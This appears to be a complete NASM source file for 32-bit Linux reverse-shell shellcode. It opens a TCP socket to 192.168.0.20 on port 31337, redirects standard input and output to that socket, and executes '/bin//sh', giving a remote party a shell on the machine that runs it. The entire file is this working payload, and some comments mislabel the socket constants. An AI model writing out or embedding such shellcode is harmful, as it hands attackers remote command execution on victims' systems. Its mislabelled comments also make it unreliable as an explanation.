BITS 32

;sys_socket(AF_INET, SOCK_STREAM, IP_PROTO)
xor ebx, ebx
mul ebx			;zero out eax,ebx,edx
push BYTE 0x66  ;for socket_call
pop eax
inc bl			;ebx = 1 for sys_socket

;build argument array
push edx
push BYTE 1		;AF_INET
push BYTE 2		;SOCK_STREAM
mov ecx, esp	;ecx points to arg array
int 0x80
xchg eax,esi	;save sockfd
xor eax,eax		;ensure eax is zeroed

;sys_connect(sockfd, [AF_INET, port, ip], 16)
inc bl 			;bl was 1 from previous call
mov dl, bl 		;dl = 2 for AF_INET later
inc bl 			;ebx = 3 for sys_connect
push BYTE 0x66	;0x66 for sys_socket call
pop eax

;build sockaddr struct
push  0x1400a8c0	;ip = 192.168.0.20
push WORD 0x697a	;port = 31337
push WORD dx		;AF_INET
xor dx,dx
mov ecx, esp

;build arg array
push BYTE 0x10 		;socklen = 16
push ecx 			;sockaddr pointer
push esi			;sockfd
mov ecx, esp		;mov all the args to ecx
int 0x80			;socket_call(3, [sockfd, [AF_INET, port, ip], 16])



;sys_dup2(newfd, oldfd)
mov ebx, esi		;mov sockfd into ebx for sys_dup2
push BYTE 2			;loop counter
pop ecx

dup_loop:
mov al, 0x3f
int 0x80
dec ecx
jns dup_loop


;sys_execve("/bin//sh")


jmp short sh_string
excve:
pop ebx			;mov pointer to bin/sh to ebx
push eax		;eax is zero after last dup2 call
mov ecx, esp
mov al, 0xb
int 0x80


sh_string:
call excve
db "/bin//sh"

